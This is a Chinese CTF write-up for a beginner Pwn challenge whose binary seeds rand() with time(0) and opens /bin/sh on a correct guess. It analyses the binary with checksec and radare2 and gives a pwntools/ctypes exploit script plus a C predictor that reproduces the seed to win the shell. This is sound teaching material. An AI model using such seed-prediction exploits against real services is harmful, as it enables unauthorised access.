---
title: 猜数字
author: 13m0n4de
difficulty: Trivial
category: Pwn
image: ghcr.io/svuctf/svuctf-helloworld-2024/srand:latest
port: 70
writeup_author: 13m0n4de
tags:
  - pseudo_random
reference:
---

# 猜数字

## 题目描述

## 题目解析

从这一题开始，Pwn 分类就开始涉及到附件程序的分析利用环节了。

### 文件信息

首先使用 `file` 命令查看文件类型：

```
$ file game
game: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c1cc42f54892f239643b27a2ee4a784c0b0c0c46, for GNU/Linux 3.2.0, not stripped
```

这是一个 64 位的 ELF 文件 (`ELF 64-bit LSB executable`)，动态链接 (`dynamically linked`)，没有去除符号 (`not stripped`)。

查看保护机制：

```
$ pwn checksec game
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

开启了 NX 保护、Canary 保护。

### 程序分析

使用反编译工具（IDA、Radare2 等，以下使用 Radare2 举例）进行分析：

```
$ r2 -AA game
```

列出所有函数：

```
[0x00401170]> afl
0x004010d0    1     11 sym.imp.putchar
0x004010e0    1     11 sym.imp.puts
0x004010f0    1     11 sym.imp.__stack_chk_fail
0x00401100    1     11 sym.imp.system
0x00401110    1     11 sym.imp.printf
0x00401120    1     11 sym.imp.srand
0x00401130    1     11 sym.imp.time
0x00401140    1     11 sym.imp.setvbuf
0x00401150    1     11 sym.imp.__isoc99_scanf
0x00401160    1     11 sym.imp.rand
0x00401170    1     37 entry0
0x004011b0    4     31 sym.deregister_tm_clones
0x004011e0    4     49 sym.register_tm_clones
0x00401220    3     32 entry.fini0
0x00401250    1      6 entry.init0
0x0040147c    1     13 sym._fini
0x004012bb    1    106 sym.banner
0x00401256    1    101 sym.init
0x004011a0    1      5 sym._dl_relocate_static_pie
0x0040143b    1     62 main
0x00401325    8    278 sym.game
0x00401000    3     27 sym._init
0x00401030    2     28 fcn.00401030
0x00401040    1     15 fcn.00401040
0x00401050    1     15 fcn.00401050
0x00401060    1     15 fcn.00401060
0x00401070    1     15 fcn.00401070
0x00401080    1     15 fcn.00401080
0x00401090    1     15 fcn.00401090
0x004010a0    1     15 fcn.004010a0
0x004010b0    1     15 fcn.004010b0
0x004010c0    1     15 fcn.004010c0
```

通过函数列表可以看到一些关键函数：

- `main`：程序入口点
- `init`：程序初始化
- `banner`：打印比赛信息
- `game`：实现主要游戏逻辑

其中 `init` 函数的作用是禁用标准输入输出的缓冲区，这是 CTF 中 Pwn 题的常见做法：

```c
setvbuf(stdin, NULL, _IONBF, 0);
setvbuf(stdout, NULL, _IONBF, 0);
setvbuf(stderr, NULL, _IONBF, 0);
```

进入主函数 `main` 中，查看反编译伪代码（`pdg` 命令需要安装 [r2ghidra](https://github.com/radareorg/r2ghidra)）：

```c
[0x0040143b]> pdg

ulong main(void)

{
    uint uVar1;
    uchar *puVar2;
    ulong uStack_10;

    uStack_10 = 0x40144d;
    uVar1 = sym.imp.time(0);
    *(*0x20 + -0x10) = 0x401454;
    sym.imp.srand(uVar1);
    puVar2 = *0x20 + -8;
    *(*0x20 + -8 + -8) = 0x40145e;
    sym.init();
    *(puVar2 + -8) = 0x401468;
    sym.banner();
    *(puVar2 + -8) = 0x401472;
    sym.game();
    return 0;
}
```

`main` 函数在一开始调用了 [time](https://man7.org/linux/man-pages/man2/time.2.html) 函数，返回当前时间戳 (Timestamp)，然后将该时间戳作为随机数种子传入 `srand` 函数，进行随机数播种。

`game` 函数包含了程序的核心逻辑，首先使用 `rand()` 生成随机数，并进行一系列运算：

```c
iVar1 = sym.imp.rand();
iStack_14 = (iVar1 - ((iVar1 / 99999 + (iVar1 >> 0x1f)) - (iVar1 >> 0x1f)) * 99999) + 1;
```

这些运算的目的是将随机数限制在 1-99999 的范围内，相当于：

```c
random_number = rand() % 99999 + 1;
```

接着程序会输出提示信息，告诉用户范围并要求输入：

```c
printf("I've thought of a number between 1 and %d.\n", 99999);
puts("You have only one chance to guess this number. Good luck!\n");
printf("Please enter your guess: ");
```

用户输入后会进行判断：

```c
iVar1 = sym.imp.__isoc99_scanf(0x402155, &stack0xffffffffffffffe8);
if (iVar1 == 1) {
    if (iStack_14 == iStack_18) {
        // 猜对了，获得 shell
        printf("\nCongratulations! You've guessed the number %d!\n", iVar1);
        system("/bin/sh");
    } else {
        // 猜错了，游戏结束
        printf("\nSorry, you didn't guess correctly. The right number was %d.\n", iVar1);
    }
} else {
    // 输入无效，游戏结束
    puts("Invalid input, game over.");
}
```

### 漏洞分析

这个程序的主要问题出在随机数生成的可预测性上。具体来说：

1. 随机数种子的问题
    - 程序使用 `time(0)` 获取的时间戳作为种子
    - 时间戳精度仅为秒级
    - 服务器和用户的系统时间差异通常很小
1. 随机数生成的特性
    - C 语言的 `rand()` 是伪随机数生成器
    - 使用相同的种子，必然产生相同的随机数序列

这两个特点结合起来导致：

- 攻击者可以通过本地时间推测服务器的随机数种子
- 使用相同种子即可生成相同的随机数，完成随机数预测

利用程序 [exp.py](./writeup/exp.py)，使用了 `ctypes` 库加载系统 libc，并调用 libc 中的函数：

```python
from pwn import *
from ctypes import cdll

context.log_level = "debug"

libc = cdll.LoadLibrary("libc.so.6")

io = process("../attachments/game")

libc.srand(libc.time(0))
number = libc.rand() % 99999 + 1

io.sendlineafter(b"Please enter your guess: ", str(number).encode())
io.interactive()
```

另一种解决方案是编写 C 程序复现目标程序的随机数生成过程：

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    srand(time(0));
    printf("%d\n", rand() % 99999 + 1);
    return 0;
}
```

编译为可执行文件后，在 Python 中通过 `os.popen().read()` 执行并获取结果：

```python
import os

number = int(os.popen("./predict").read())
io.sendlineafter(b"Please enter your guess: ", str(number).encode())
```

需要注意的是，C 语言的随机数生成依赖于 libc 的具体实现。虽然靶机使用的是 Ubuntu 20.04，但大多数 Linux 发行版的 libc 实现区别不大，都可以完成预测。
